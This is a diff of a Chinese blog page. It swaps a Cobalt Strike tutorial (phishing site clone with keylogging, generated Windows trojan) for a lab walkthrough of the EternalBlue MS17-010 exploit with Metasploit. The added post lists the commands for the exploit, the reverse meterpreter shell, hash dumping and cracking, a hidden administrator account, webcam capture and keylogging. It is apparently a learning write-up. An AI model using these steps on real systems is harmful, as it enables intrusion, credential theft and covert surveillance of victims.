@@ -10,7 +10,7 @@
     
     
     
-    <title>CS上线 | EternalGemini</title>
+    <title>MS17-010 | EternalGemini</title>
     <!-- inject:style -->
     <link href="/css/style.css" rel="stylesheet" type="text/css">
     <!-- endinject -->
@@ -161,97 +161,142 @@
     <div class="cube-content">
         <div class="cube-left">
             <div class="cube-article">
-    <h1 class="title">CS上线</h1>
+    <h1 class="title">MS17-010</h1>
     
     <div class="cube-article-header">
         <div class="cube-article-date">
             <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
             <!-- moment.js对象 -->
-            2022-02-14
+            2022-01-30
         </div>
         <div class="cube-article-tags">
     <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
     
-    <a href="/tags/%E4%BB%85%E4%BE%9B%E5%AD%A6%E4%B9%A0%E5%8F%82%E8%80%83%EF%BC%81%EF%BC%81%EF%BC%81/">#仅供学习参考！！！</a>
+    <a href="/tags/%E6%9C%AC%E5%AE%9E%E9%AA%8C%E4%BB%85%E4%BE%9B%E5%AD%A6%E4%B9%A0%E5%8F%82%E8%A7%82%EF%BC%81%EF%BC%81%EF%BC%81/">#本实验仅供学习参观！！！</a>
     
 </div>
     </div>
     
     <div class="cube-article-content cube-markdown">
         
-        <p>Cobalt Strike 一款以由美国redteam团队，研发出来的一款以Metasploit为基础的GUI框架式渗透测试工具。</p>
+        <p>永恒之蓝之所以叫永恒之蓝，是因为利用这个漏洞容易造成靶机蓝屏。下面是我在学习永恒之蓝时使用漏洞的过程和渗透后的漏洞利用。</p>
 <span id="more"></span>
 
-<p>一、搭建服务器</p>
-<p>1.在kali中解压压缩包并且将压缩包单独放入一个文件 。</p>
-<img src="/p/8f17ee8w/1.png" class="">
+<p>软件：Vmware Workstation 16</p>
+<p>攻击机：Kali 192.168.0.109</p>
+<p>靶机：windows 7 192.168.0.107</p>
+<p>渗透工具：Metasploit</p>
+<p>扫描工具：Nmap<br>解密工具: ophcrack</p>
+<p>1.确保靶机和攻击机在同一个局域网，先查看攻击机的地址</p>
+<p>ifconfig</p>
+<p>攻击机地址为 192.168.0.10</p>
+<img src="/_posts/undefined/1.png" class="">
 
-<p>2.进入CS目录，并且给予相关权限</p>
-<p>chmod 777 *</p>
-<img src="/p/8f17ee8w/2.png" class="">
+<p>2.使用Nmap工具扫描攻击机所在内网段，查找目标主机是否存活</p>
+<p>nmap -sP 192.168.0.0/24</p>
+<p>发现靶机 192.168.0.107</p>
+<img src="/_posts/undefined/2.png" class="">
 
-<p>3.查看ip地址 ifconfig</p>
-<p> 运行cs，设置服务器ip和密码    ./teamserver.sh 192.168.0.108 admin（admin是密码） </p>
-<p>注意服务的端口号为，这里默认的是 27000</p>
-<img src="/p/8f17ee8w/3.png" class="">
+<p>3.打开渗透工具</p>
+<p>msfconsole</p>
+<img src="/_posts/undefined/3.png" class="">
 
-<p>4.回到win10 解压后打开文件夹 找到CobaltStrike_CN.vbs 或者CobaltStrike_eN.vbs打开</p>
-<p>IP为服务器（kali）的IP<br>端口号 在CS启动的时候可以看见端口号<br>用户名 为登录之后给别人看的名字，可以瞎写<br>密码 为之前设置的密码</p>
-<img src="/p/8f17ee8w/4.png" class="">
+<p>4.搜索漏洞MS17-010</p>
+<p>search ms17-010</p>
+<img src="/_posts/undefined/4.png" class="">
 
-<img src="/p/8f17ee8w/5.png" class="">
+<p>5.选择攻击模块2</p>
+<p>use 2 或者use exploit/windows/smb/ms17_010_eternalblue</p>
+<img src="/_posts/undefined/5.png" class="">
 
-<p>登录成功界面</p>
-<img src="/p/8f17ee8w/6.png" class="">
+<img src="/_posts/undefined/6.png" class="">
 
-<p>二、CS简单使用</p>
-<p>1.点击左上方CobaltStrike选项——&gt;在下拉框中选择 Listeners ——&gt;在下方弹出区域中点击add  建立一个监听器</p>
-<img src="/p/8f17ee8w/7.png" class="">
+<p>6.查看需要配置的信息</p>
+<p>show options</p>
+<img src="/_posts/undefined/7.png" class="">
 
-<p>name随便取，HTTP Hosts点击旁边的加号，HTTP Port（C2）随便取</p>
-<p>HTTP Hosts 是shell反弹的主机，就是kali</p>
-<p>HTTP Port（C2） C2监听的端口</p>
-<img src="/p/8f17ee8w/8.png" class="">
+<img src="/_posts/undefined/8.png" class="">
 
-<p>2.生成钓鱼网站</p>
-<p>Attacks  –&gt; Web Drive-by  –&gt; Clone Site</p>
-<img src="/p/8f17ee8w/9.png" class="">
+<p>7.配置需要配置的RHOSTS为靶机的地址</p>
+<p>set RHOSTS 192.168.0.107</p>
+<img src="/_posts/undefined/9.png" class="">
 
-<p>Cone URL 选择要克隆的网站网址</p>
-<p>勾上监听键盘选项</p>
-<img src="/p/8f17ee8w/10.png" class="">
+<p>8.设置攻击载荷 tcp反向链接</p>
+<p>set payload windows/x64/meterpreter/reverse_tcp</p>
+<img src="/_posts/undefined/10.png" class="">
 
-<p>成功后会生成一个url,点击url,并且任意敲击键盘</p>
-<img src="/p/8f17ee8w/11.png" class="">
+<p>9.实施攻击（要关闭靶机的防火墙，不然会失败）</p>
+<p>run 或者 exploit</p>
+<img src="/_posts/undefined/11.png" class="">
 
-<img src="/p/8f17ee8w/12.png" class="">
+<p>10.渗透后利用</p>
+<p>a.截取靶机屏幕 screenshot</p>
+<img src="/_posts/undefined/12.png" class="">
 
-<img src="/p/8f17ee8w/13.png" class="">
+<img src="/_posts/undefined/14.png" class="">
 
-<p>3.生成木马</p>
-<p>选择 Attacks –&gt; Packages –&gt; Windows Executable</p>
-<p>Listener 选择想要监听的</p>
-<p>x64也打上勾</p>
-<p>然后点击Generate保存文件</p>
-<img src="/p/8f17ee8w/14.png" class="">
+<p>b.从攻击机上传文件到靶机</p>
+<p>upload /root/ppp.jpeg C:\看不见我.jpeg</p>
+<img src="/_posts/undefined/15.png" class="">
 
-<p>4.双击文件，CS中就会显示上线（用虚拟机好一点，我用的物理机-。-）</p>
-<img src="/p/8f17ee8w/15.png" class="">
+<img src="/_posts/undefined/16.png" class="">
 
-<p>5.渗透</p>
-<p>先右键靶机，把session中sleep的值改为0</p>
-<img src="/p/8f17ee8w/16.png" class="">
+<p>从靶机下载文件到攻击机</p>
+<p>download C:\11.jpeg /root</p>
+<p>download C:\11.exe /root</p>
+<img src="/_posts/undefined/17.png" class="">
 
-<img src="/p/8f17ee8w/17.png" class="">
+<img src="/_posts/undefined/18.png" class="">
 
-<p>6.右键靶机点击interact渗透</p>
-<img src="/p/8f17ee8w/18.png" class="">
+<p>c.查看账户和密码并使用工具在线解密工具解密//也可以使用kali自带的ophcrack工具进行解密（这个要自己下载彩虹表）</p>
+<p>hashdump</p>
+<img src="/_posts/undefined/19.png" class="">
 
-<img src="/p/8f17ee8w/19.png" class="">
+<p>打开一个新的命令窗口 输入ophcrack，将hash值复制过来，点击crack就可以爆破（我没有下载彩虹表，所以我采用在线工具破解，但是我的账户本来就没有设置密码，所以结果为空）</p>
+<img src="/_posts/undefined/20.png" class="">
 
-<p>7.后渗透利用</p>
-<p>在底部框中输入命令</p>
-<img src="/p/8f17ee8w/20.png" class="">
+<img src="/_posts/undefined/21.png" class="">
+
+<p>d. shell新增账户并远程登录目标主机</p>
+<p>新建一个简单隐藏用户admin$ 密码为admin //用命令查看看不到改用户</p>
+<img src="/_posts/undefined/22.png" class="">
+
+<img src="/_posts/undefined/23.png" class="">
+
+<p>将用户admin$添加到administrator组</p>
+<p>net localgroup administrators admin$ /add</p>
+<img src="/_posts/undefined/24.png" class="">
+
+<p>开启远程管理服务</p>
+<img src="/_posts/undefined/25.png" class="">
+
+<p>通过物理机进行远程登录（这个要靶机同意，有点鸡肋）</p>
+<img src="/_posts/undefined/26.png" class="">
+
+<img src="/_posts/undefined/27.png" class="">
+
+<p>e.开启摄像头</p>
+<p>webcam_snap –&gt;通过摄像头拍照</p>
+<img src="/_posts/undefined/29.png" class="">
+
+<img src="/_posts/undefined/30.png" class="">
+
+<p>webcam_stream –&gt;通过摄像头开启视频(这个就不演示了，保留一点神秘)</p>
+<p>f.监听键盘</p>
+<p>ps查看进程号，找到explorer.exe</p>
+<img src="/_posts/undefined/31.png" class="">
+
+<p>迁移进程</p>
+<p>migrate 1408</p>
+<img src="/_posts/undefined/32.png" class="">
+
+<p>keyscan_start监听键盘</p>
+<img src="/_posts/undefined/33.png" class="">
+
+<p>keyscan_dump查看键盘输入的内容</p>
+<img src="/_posts/undefined/34.png" class="">
+
+<p>总结:这个渗透攻击的重点在于渗透后的利用，这里只是举出了一小部分例子，可以自己研究研究还可以实现哪些操作。</p>
 
     </div>
 </div>
@@ -259,13 +304,13 @@
 <div class="cube-article-nav">
     <ul>
         
-        
-        <li class="next">
-            <a href="/p/undefined.html">
+        <li class="prev">
+            <a href="/_posts/undefined.html">
+                <i class="cube-icon cube-prev" aria-hidden="true"></i>
                 MSF上线
-                <i class="cube-icon cube-next" aria-hidden="true"></i>
             </a>
         </li>
+        
         
     </ul>
 </div>
@@ -351,7 +396,7 @@
                     <span>1</span>
                 </p>
                 <p class="title">
-                    <a href="/p/8f17ee8w.html" title="CS上线">CS上线</a>
+                    <a href="/_posts/8f17ee8w.html" title="CS上线">CS上线</a>
                 </p>
             </div>
             
@@ -365,7 +410,7 @@
                     <span>2</span>
                 </p>
                 <p class="title">
-                    <a href="/p/undefined.html" title="MSF上线">MSF上线</a>
+                    <a href="/_posts/undefined.html" title="MSF上线">MSF上线</a>
                 </p>
             </div>
         </li>
@@ -378,7 +423,7 @@
                     <span>3</span>
                 </p>
                 <p class="title">
-                    <a href="/p/undefined.html" title="MS17-010">MS17-010</a>
+                    <a href="/_posts/undefined.html" title="MS17-010">MS17-010</a>
                 </p>
             </div>
         </li>
@@ -398,7 +443,7 @@
     <div class="cube-boxs">
         
         
-        <div class="cube-box-bg ">
+        <div class="cube-box ">
             <a href="/tags/%E4%BB%85%E4%BE%9B%E5%AD%A6%E4%B9%A0%E5%8F%82%E8%80%83%EF%BC%81%EF%BC%81%EF%BC%81/">#仅供学习参考！！！</a>
         </div>
         
